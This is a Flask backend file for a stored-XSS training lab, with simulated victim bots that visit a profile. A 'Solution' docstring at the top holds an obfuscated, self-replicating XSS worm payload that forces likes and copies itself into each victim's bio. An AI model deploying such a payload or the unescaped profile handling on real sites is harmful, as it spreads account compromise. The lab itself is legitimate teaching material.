#!/usr/bin/env python3
''' Proudly Written by Yosri '''
from flask import (
    session, redirect, url_for, request
)
from functools import wraps
from redis import Redis
from secrets import token_urlsafe
from time import asctime
from .bots import visit_user
from json import loads, dumps
from time import sleep
'''
Solution
Hack The World, Follow Me For The Fastest Spreading Virus "></div><script>eval(atob("aWYgKHdpbmRvdy5sb2NhdGlvbi5wYXRobmFtZSAhPSAiL2EzL3hzc19zdG9yZWQvcHJvZmlsZSIpIHtmZXRjaCgiL2FwaS9hMy94c3Nfc3RvcmVkL2xpa2UvNTgyNjM5NjYiKTtmZXRjaCgiL2FwaS9hMy94c3Nfc3RvcmVkL3VwZGF0ZSIseyJoZWFkZXJzIjp7ImNvbnRlbnQtdHlwZSI6ImFwcGxpY2F0aW9uL2pzb24ifSwiYm9keSI6SlNPTi5zdHJpbmdpZnkoe2JpbzogYXRvYigiSWo0OEwyUnBkajQ4YzJOeWFYQjBQbWxtSUNoM2FXNWtiM2N1Ykc5allYUnBiMjR1Y0dGMGFHNWhiV1VnSVQwZ0lpOWhNeTk0YzNOZmMzUnZjbVZrTDNCeWIyWnBiR1VpS1NCN1ptVjBZMmdvSWk5aGNHa3ZZVE12ZUhOelgzTjBiM0psWkM5c2FXdGxMelU0TWpZek9UWTJJaWs3Wm1WMFkyZ29JaTloY0drdllUTXZlSE56WDNOMGIzSmxaQzkxY0dSaGRHVWlMSHNpYUdWaFpHVnljeUk2ZXlKamIyNTBaVzUwTFhSNWNHVWlPaUpoY0hCc2FXTmhkR2x2Ymk5cWMyOXVJbjBzSW1KdlpIa2lPa3BUVDA0dWMzUnlhVzVuYVdaNUtIdGlhVzg2SUdGMGIySW9Ja2xxTkRoTU1sSndaR28wT0dNeVRubGhXRUl3VUcxYWJHUkhUbTlMUTBsMldWaENjRXd5UlhwTU0yaDZZekU1ZW1SSE9YbGFWMUYyWWtkc2NscFRPREZQUkVreVRYcHJNazVwU1hCUGVuZDJZekpPZVdGWVFqQlFhbmhyWVZoWlowbG5QVDBpS1gwcExDSnRaWFJvYjJRaU9pSlFUMU5VSWl3aVkzSmxaR1Z1ZEdsaGJITWlPaUpwYm1Oc2RXUmxJbjBwZlR3dmMyTnlhWEIwUGp4a2FYWWciKX0pLCJtZXRob2QiOiJQT1NUIiwiY3JlZGVudGlhbHMiOiJpbmNsdWRlIn0pO30="));</script><div "
'''


class xssStore:
    def __init__(self):
        print('init xssStore')
        self.users = {
            'yosri': {
                'base36': xssStoreMethods.base36_to_int('yosri'),
                'password': 'yosri',
                'followers': set(),
                'following': set(),
                'last_actions': [],
                'user_info': {
                    'f_name': 'Yosri',
                    'l_name': 'G',
                    'email': 'yosri@web0x01.hbtn',
                    'role': 'Cyber Security Expert',
                    'tz': '1',
                    'bio': 'Hello, Follow me through our journey towards Cyber Security Expertise.'
                }
            },
            'john': {
                'base36': xssStoreMethods.base36_to_int('john'),
                'password': f'{token_urlsafe(16)}',
                'followers': set(),
                'following': set(),
                'last_actions': [],
                'user_info': {
                    'f_name': 'John',
                    'l_name': 'Doe',
                    'email': 'john@web0x01.hbtn',
                    'role': 'Cyber Security Expert',
                    'tz': '2',
                    'bio': 'Hello, Follow me through our journey towards Cyber Security Expertise.'
                }
            },
            'jimmy': {
                'base36': xssStoreMethods.base36_to_int('jimmy'),
                'password': f'{token_urlsafe(16)}',
                'followers': set(),
                'following': set(),
                'last_actions': [],
                'user_info': {
                    'f_name': 'Jimmy',
                    'l_name': 'Neutron',
                    'email': 'jimmy@web0x01.hbtn',
                    'role': 'Cyber Security Expert',
                    'tz': '2',
                    'bio': 'Hello, Follow me through our journey towards Cyber Security Expertise.'
                }
            },
            'dexter': {
                'base36': xssStoreMethods.base36_to_int('dexter'),
                'password': f'{token_urlsafe(16)}',
                'followers': set(),
                'following': set(),
                'last_actions': [],
                'user_info': {
                    'f_name': 'Dexter',
                    'l_name': 'Didi',
                    'email': 'dexter@web0x01.hbtn',
                    'role': 'Cyber Security Expert',
                    'tz': '2',
                    'bio': 'Hello, Follow me through our journey towards Cyber Security Expertise.'
                }
            }
        }
        for user in self.users.keys():
            if user != 'yosri':  # Yosri doesn't visit himself
                self.visit(user, 'yosri')

    def auth(self, data):
        if not session.get('xssStore', False):
            session['xssStore'] = {
                'auth_count': 0,
                'auth': False
            }
        session['xssStore'] = {
            **session['xssStore'],
            'auth_count': session['xssStore']['auth_count'] + 1,
        }
        if session['xssStore']['auth_count'] > 3:
            return False, 'Cought By Firewall!\nReset Session!'
        if set(data) != {'username', 'password'}:
            return False, 'Wrong Form.\nTry Harder!'
        if len(data['username']) < 4:
            return False, 'Short Username.\nTry Harder!'
        username = data['username']
        if not self.users.get(username, False):
            return False, 'Wrong Username.\nTry Harder!'
        if data['password'] != self.users[username]['password']:
            return False, 'Wrong Password.\nTry Harder!'
        session['xssStore'] = {
            **session['xssStore'],
            'auth': True,
            'username': username
        }
        return True, ''
    
    def update(self, username, data):
        current = ['f_name', 'l_name', 'email', 'role', 'tz', 'bio']
        if not set(data).issubset(current):
            return False, 'Wrong Form.\nTry Harder!'

        self.users[username]['user_info'].update(data)
        self.add_activity(username, f'You - Updated your profile - {asctime()}.')

        # If the bio contains an XSS payload, make all users visit Yosri
        if 'bio' in data and '<script>' in data['bio']:
            for user in self.users.keys():
                if user != 'yosri':  # Yosri doesn't visit himself
                    sleep(2)
                    proc = visit_user(request.url_root, user, self.users[user]['password'], self.users['yosri']['base36'])

        return True, ''


    def add_activity(self, username, activity):
        self.users[username]['last_actions'].append(activity)
        return True
    
    def visit(self, visitor, profile):
        self.add_activity(profile, f'{visitor.capitalize()} - Visited you - {asctime()} - UserID: {self.users[visitor]["base36"]}')
        self.add_activity(visitor, f'You - Visited {profile.capitalize()} - {asctime()} - UserID: {self.users[visitor]["base36"]}')

        # Ensure the visitor does NOT follow anyone
        self.users[visitor]['following'] = set()  

        # Auto-follow the visited profile ONLY if the magic (bio XSS) was triggered
        if 'bio' in self.users[profile]['user_info'] and 'script' in self.users[profile]['user_info']['bio']:
            if visitor not in self.users[profile]['followers']:
                follow_msg = self.follow(visitor, profile)
                self.add_activity(visitor, follow_msg)

        return True



    def follow(self, follower, following):
        self.users[follower]['following'].add(following)
        self.users[following]['followers'].add(follower)
        self.add_activity(following, f'{follower.capitalize()} - Followed you - {asctime()} - UserID: {self.users[follower]["base36"]}')
        return_msg = f'You - Followed {following.capitalize()} - {asctime()} - UserID: {self.users[follower]["base36"]}'
        self.add_activity(follower, return_msg)
        return return_msg

    def reset(self):
        session['xssStore'] = {
            'auth_count': 0,
            'auth': False
        }
        self.__init__()
        return True


class xssStoreMethods:
    def int_to_base36(num):
        alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
        if num < 0:
            return '-' + xssStoreMethods.int_to_base36(-num)
        elif num < 36:
            return alphabet[num]
        else:
            return xssStoreMethods.int_to_base36(num // 36) + alphabet[num % 36]

    def base36_to_int(string):
        return int(string, 36)

    def check_session(function):
        @wraps(function)
        def decorated_function(*args, **kwargs):
            if not session.get('xssStore', False):
                session['xssStore'] = {
                    'auth_count': 0,
                    'auth': False
                }
            if session['xssStore'].get('auth_count', 0) > 3:
                return ('Cought By Firewall, Reset Session!', 204)
            if not session['xssStore'].get('auth', False):
                return redirect(url_for('a3_xss_stored_front.login'))
            return function(*args, **kwargs)
        return decorated_function

